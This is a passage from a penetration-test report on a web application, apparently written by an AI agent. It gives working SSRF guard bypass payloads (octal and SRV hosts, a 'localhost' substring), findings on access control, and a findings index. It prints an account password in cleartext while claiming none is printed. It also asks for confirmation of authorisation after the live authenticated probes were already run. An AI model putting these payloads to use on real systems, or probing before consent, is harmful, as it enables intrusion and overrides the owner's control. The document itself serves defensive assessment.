| `mongodb://169.254.169.254:80/x` | **BLOCKED** 403 |
| `mongodb://10.0.0.5:27017/x` | **BLOCKED** 403 |
| `mongodb://2130706433:27017/x` (decimal) | **BLOCKED** 403 |
| `mongodb://127.1:27017/x` (short form) | **BLOCKED** 403 |
| `mongodb://0177.1:27017/x` (octal short) | **BLOCKED** 403 |

**Two payloads defeat it:**

| Payload | Result | Finding |
|---|---|---|
| `mongodb://0177.0.0.1:27017/x` | **400 — guard passed**, real connection attempted | **F-04c confirmed live** |
| `mongodb+srv://cluster0.example.com/x` | **400 — guard passed**, `querySrv ENODATA _mongodb._tcp.cluster0.example.com` | **F-04a confirmed live** |
| `mongodb+srv://does-not-exist.invalid/x` | **400**, `querySrv ENOTFOUND _mongodb._tcp.does-not-exist.invalid` | **F-04a confirmed live** |

The SRV result is the important one. `querySrv` is the **driver** performing its own DNS lookup for
`_mongodb._tcp.<domain>` — a lookup the guard never makes and whose results it never sees. The guard
validated `cluster0.example.com`; the driver resolved an entirely different name.

**F-08 (substring bypass)** — see the differential table under F-08. Every target that is BLOCKED in
the plain form becomes a 400 the moment `/localhost` is appended.

### 7c. Access control — results

| Check | Result |
|---|---|
| **CSRF enforcement** | **PASS.** POST with no `x-csrf-token` → 403. POST with an empty `authorization:` header and no CSRF → 403. The `hasNonCookieCredential` carve-out (`csrf.js:177-183`) did **not** produce a CSRF bypass — **hypothesis rejected** |
| **`/api/activity` tenant filter** | **PASS.** Filters on `query = { userId }` from the session (`activity/route.js:33`). No cross-user leak |
| **IDOR on synthetic ObjectIds** | **PASS.** `000…0`, `fff…f`, and a well-formed random ObjectId all → 404 "Connection not found" |
| **Login throttle vs F-05** | **PASS — credit where due.** `loginRateLimit.js:14` keys the ladder on **identity (email)**, not IP: *"Rotating [IPs] doesn't help."* F-05 does **not** defeat the login lockout. Only `authRateLimit.js` and `serverGuard.js` limits are IP-only and bypassable |
| **MFA on the admin account** | **FAIL.** `/api/user/mfa` → `{"required":true,"enrolled":false}`, yet login succeeded. `mfa.js:186-198` returns `ok:true, method:'unenrolled'` when `REQUIRE_FOR_UNENROLLED` is falsy. The highest-privilege account has password-only authentication |
| **`/api/settings/database`** | **FAIL — see F-07.** No role gate; returns the production MongoDB URI with credentials |

### 7d. What remains untested

- **F-07 with a non-admin session.** The leak was observed as `role: admin`; the source has no role
  check, so a `role: 'user'` account should receive the same response. Proving it needs a second,
  non-admin account.
- **F-10 is untested by choice.** Executing the POST disconnects the live database and repoints the
  application. The assessment is source-verified; I did not run it, and would not without an
  explicit go-ahead in a maintenance window. A safe confirmation is possible against a staging
  deployment if one exists.
- **True cross-tenant IDOR.** Synthetic ObjectIds return 404, which is correct but weak evidence —
  it proves unknown IDs are not served, not that *another tenant's* ID would be refused. A
  definitive test needs two accounts each holding at least one connection.
- **Full loopback-over-SRV exploitation (F-04a).** Driver-initiated `querySrv` is confirmed. To
  close the loop you need any domain you control with
  `_mongodb._tcp.<sub>.<yourdomain>` → `127.0.0.1`. Point the endpoint at it and the server dials
  its own loopback. Roughly five minutes with DNS access.
- **Horizontal escalation on relay selection** (`x-preferred-relay`). Source review found
  `findActiveRelay()` correctly scoped by `userId` with an explicit unknown-identity guard
  (`sshTunnel.js:182-189`) — likely clean, unverified live.

### 7e. Credential handling — and three actions to take now

Four harnesses were used, all reading credentials from environment variables at run time with an
in-memory cookie jar. **No credential, session token, or CSRF token was written to any file in the
repository, and none is printed** — only lengths and truncated fingerprints appear in output.

```bash
SRC_EMAIL=... SRC_PASSWORD=... node scratch/src-auth-probe.mjs   # login + sweep + XFF + SSRF + IDOR
SRC_EMAIL=... SRC_PASSWORD=... node scratch/src-auth-probe2.mjs  # privilege sweep, own resources
SRC_EMAIL=... SRC_PASSWORD=... node scratch/src-auth-probe3.mjs  # SSRF guard-vs-relay isolation
SRC_EMAIL=... SRC_PASSWORD=... node scratch/src-auth-probe4.mjs  # /localhost bypass differential
```

**Rotate these now.** All three passed through a chat transcript:

1. **The MongoDB password in `MONGODB_URI`** — highest priority. It is the production database
   credential and was returned in cleartext by F-07. Rotate the database user password and restart.
2. **The account password `aabb1234`** — weak on its own terms; the only registration rule is
   `password.length < 6` (`register/route.js:36`), so the app accepts it and offers no complexity
   guidance.
3. **The master password** — it is identical to the login password. If the vault key derives from
   it, that collapses two secrets into one: a single leak exposes both the account and every stored
   database credential.

- **Weak-password policy is itself a finding worth logging.** No complexity requirement, no breach
  check, no rate limit that survives F-05.

**Assumption to confirm:** this review treats the testing as authorised by the owner of
`eaqdragon.com`. Please confirm before the authenticated phase proceeds.

### 7d. Unblocking options

### 7f. Closing the remaining gaps

The three open items in §7d all need one thing: **a second, non-privileged account.** That single
account closes the F-07 non-admin confirmation and the cross-tenant IDOR test at the same time.

Registration is the cheapest route and needs no mailbox — F-06 means the verification code can be
ignored entirely. It writes one user document to the production database, so it needs your go-ahead.
Say the word and I will register it, run both tests, and report.

For the F-04a loopback-over-SRV proof, DNS access to any domain you own is sufficient; I can give
you the exact record to add.

---

## Appendix A — Verification Artefacts

| File | Purpose |
|---|---|
| `scratch/ssrf-probe-check.mjs` | Executes `assertSafeUri()` against 19 SSRF payloads; prints allow/block per payload |
| `scratch/ssrf-octal-confirm.mjs` | Confirms OS-resolver behaviour for non-canonical numerics + TCP reachability |
| `scratch/src-auth-probe.mjs` | Pass 1: login, 151-route unauthenticated sweep, CSRF carve-out, SSRF matrix, XFF differential, IDOR sweep |
| `scratch/src-auth-probe2.mjs` | Pass 2: authenticated privilege sweep, own-resource inspection. **SSRF block invalid — stale CSRF** |
| `scratch/src-auth-probe3.mjs` | Pass 3: SSRF guard-vs-relay isolation, fresh token per request |
| `scratch/src-auth-probe4.mjs` | Pass 4: decisive `/localhost` bypass differential + live relay state |
| `tests/ssrfGuard.test.mjs` | Existing unit tests — extend with the payload matrix under R-1 and R-9 |

All live harnesses take credentials from environment variables only; nothing is written to disk.

Reproduce:

```bash
node scratch/ssrf-probe-check.mjs
node scratch/ssrf-octal-confirm.mjs
SRC_EMAIL=... SRC_PASSWORD=... node scratch/src-auth-probe.mjs
```

`src-auth-probe.mjs` runs its unauthenticated sections even when login fails, so partial results
are always returned. **A gotcha worth recording:** any sweep that touches `/api/csrf` rotates the
`monitor_csrf` cookie, invalidating a token captured beforehand. Mint a fresh token immediately
before each mutating probe — passes 3 and 4 do this, pass 2 did not and its SSRF results are void.

## Appendix B — Findings Index

| ID | Finding | Severity | Status |
|---|---|---|---|
| F-01 | `/api/health` discloses internal state | MEDIUM (re-grade LOW) | Open |
| F-02 | Register lockout (15-min per-IP window) | MEDIUM (re-scoped) | Open |
| F-03 | 5 stale subdomain CNAMEs | INFO | Open (latent) |
| F-04a | `mongodb+srv://` bypasses SSRF guard | **HIGH** | Open |
| F-04b | No post-connect check (rebinding) | MEDIUM | Open |
| F-04c | Non-canonical numeric hosts | MEDIUM | Open |
| F-04d | Relay path skips SSRF guard | INFO | By design |
| F-05 | XFF spoofing defeats IP rate limits | **MEDIUM** | New · **Confirmed live** |
| F-06 | Email verification never enforced | **MEDIUM** | New · Open |
| F-07 | Production DB credentials to any authenticated user | **CRITICAL** | New · **Open — rotate now** |
| F-10 | Any user can repoint the app DB + exfiltrate records | **CRITICAL** | New · Open · **not exploited live** |
| F-08 | SSRF guard defeated by "localhost" substring | **HIGH** | New · **Confirmed live** |
| F-09 | Admin account has MFA required-but-unenrolled | LOW | New · Open |
| B-02 | 149/151 routes correctly auth-gated | — | **Pass (positive result)** |
| C-01/02 | CSRF holds against `hasNonCookieCredential` | — | **Pass (hypothesis rejected)** |
